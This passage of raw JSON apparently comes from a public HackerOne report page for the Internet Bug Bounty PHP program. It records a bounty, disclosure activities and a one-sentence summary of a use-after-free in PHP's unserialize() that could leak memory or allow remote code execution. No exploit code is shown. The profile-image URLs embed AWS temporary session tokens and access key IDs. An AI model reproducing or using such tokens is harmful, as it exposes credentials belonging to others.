(IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"ryat","url":"/ryat"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026290,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:32:56.431Z","updated_at":"2019-10-13T09:32:56.431Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6026918,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T11:09:11.273Z","updated_at":"2019-10-13T11:09:11.273Z","actor":{"username":"ryat","cleared":false,"url":"/ryat","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYBTYHVYS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043643Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDaKSTb3EChMgDTnysheqj5DhaFkWfkkLg9bprhKLUhsAiB3C00GsGWPJ6DuGLnGT1QsFSaZNKPdgtEXvXm4QoYLsiq0AwhUEAEaDDAxMzYxOTI3NDg0OSIMAKVqIapKAKzPexnZKpEDp%2BNLAgbgUlhwrBi93XL5W8aXKcuP8OoU9PT5BjU3pGUUI3g8Hu%2F4mjuBIaaRGbLvV8UJpkO9TBUEHIaEDIs8rZ0mDIch3ncHlvNBW0BE%2FAMSLnWUINOrehikB0g2I0AasjVirqQ%2Fy2nzZDpofkxR%2FnfplnvAu337WSH5xyBgStfPxaD3qFE2SJgAQ6%2F8CsellltNw75POpRTlwBIeEZNjx3vJt1S9NN9jBHfQDYE%2FG0RZztV8Ec04hd%2BavbhCYzWtNl5pM8XtLOu7eDGWx2LHgHrrw0sNu7KMo%2Fp9Ti6b5H%2BlVa7TqU3NHJAcKPLuXNKPToWZYkFz45uFMB4g49BETD5Qseg7cz1z3ASfisMuXItKhc3Wmk28p7pggGcPnQTY7dJJ1LOUwWwHH69oX3qS2kKv%2BRk5swcc6rM4X8l2IXKvY3TS3Pd9kLaOdn5k2lcjiOZ0A2fpyl1be4XYY5v65Yow%2B53d7KYx2VAJ12oxjuILMh8DCI4mZ34lyPZeYXi0qlROqXDnv%2BzvnFHwIc8bjwwzrKq%2FwU67AFH0q5LeEdp6jxUg8gumwG55ojw09a8k8VkzxfdxIdWlGrCsAnv14Smo%2FTwIgFKRYc60KggUSXjAAOqVWkA5PD1%2BbOiqWpsghnC0p4DGK9tO3b4L0fZDKknZWHAzHsgOhycQDfPnrOZ6Cd00JV3ty2KQPAz2OXd%2BmldNq%2BOnR0lQXMZ8pOk4qqZMoDjQJnqG0TJup6wH%2FAuy9Ul6b9OZxeVGUeTP1hXpi7GP86nRctZDdbWYqP0KLrV7tO537fAinbfxIHlQMC0gJCGfRBDPpP4lR4OSKuI%2BEjkVpBN%2B1%2FaR3XrMykMIrZSkbFlcA%3D%3D\u0026X-Amz-Signature=9e0e784ae85f81cab640f422068fe7eb26dbebbe9a8db75ce4f69cc4670b8992"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026919,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T11:09:11.327Z","updated_at":"2019-10-13T11:09:11.327Z","actor":{"username":"ryat","cleared":false,"url":"/ryat","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYBTYHVYS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043643Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDaKSTb3EChMgDTnysheqj5DhaFkWfkkLg9bprhKLUhsAiB3C00GsGWPJ6DuGLnGT1QsFSaZNKPdgtEXvXm4QoYLsiq0AwhUEAEaDDAxMzYxOTI3NDg0OSIMAKVqIapKAKzPexnZKpEDp%2BNLAgbgUlhwrBi93XL5W8aXKcuP8OoU9PT5BjU3pGUUI3g8Hu%2F4mjuBIaaRGbLvV8UJpkO9TBUEHIaEDIs8rZ0mDIch3ncHlvNBW0BE%2FAMSLnWUINOrehikB0g2I0AasjVirqQ%2Fy2nzZDpofkxR%2FnfplnvAu337WSH5xyBgStfPxaD3qFE2SJgAQ6%2F8CsellltNw75POpRTlwBIeEZNjx3vJt1S9NN9jBHfQDYE%2FG0RZztV8Ec04hd%2BavbhCYzWtNl5pM8XtLOu7eDGWx2LHgHrrw0sNu7KMo%2Fp9Ti6b5H%2BlVa7TqU3NHJAcKPLuXNKPToWZYkFz45uFMB4g49BETD5Qseg7cz1z3ASfisMuXItKhc3Wmk28p7pggGcPnQTY7dJJ1LOUwWwHH69oX3qS2kKv%2BRk5swcc6rM4X8l2IXKvY3TS3Pd9kLaOdn5k2lcjiOZ0A2fpyl1be4XYY5v65Yow%2B53d7KYx2VAJ12oxjuILMh8DCI4mZ34lyPZeYXi0qlROqXDnv%2BzvnFHwIc8bjwwzrKq%2FwU67AFH0q5LeEdp6jxUg8gumwG55ojw09a8k8VkzxfdxIdWlGrCsAnv14Smo%2FTwIgFKRYc60KggUSXjAAOqVWkA5PD1%2BbOiqWpsghnC0p4DGK9tO3b4L0fZDKknZWHAzHsgOhycQDfPnrOZ6Cd00JV3ty2KQPAz2OXd%2BmldNq%2BOnR0lQXMZ8pOk4qqZMoDjQJnqG0TJup6wH%2FAuy9Ul6b9OZxeVGUeTP1hXpi7GP86nRctZDdbWYqP0KLrV7tO537fAinbfxIHlQMC0gJCGfRBDPpP4lR4OSKuI%2BEjkVpBN%2B1%2FaR3XrMykMIrZSkbFlcA%3D%3D\u0026X-Amz-Signature=9e0e784ae85f81cab640f422068fe7eb26dbebbe9a8db75ce4f69cc4670b8992"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":2578,"category":"researcher","content":"A use-after-free vulnerability was discovered in PHP's unserialize() with customized serializing class that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eA use-after-free vulnerability was discovered in PHP\u0026#39;s unserialize() with customized serializing class that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\u003c/p\u003e\n"}]}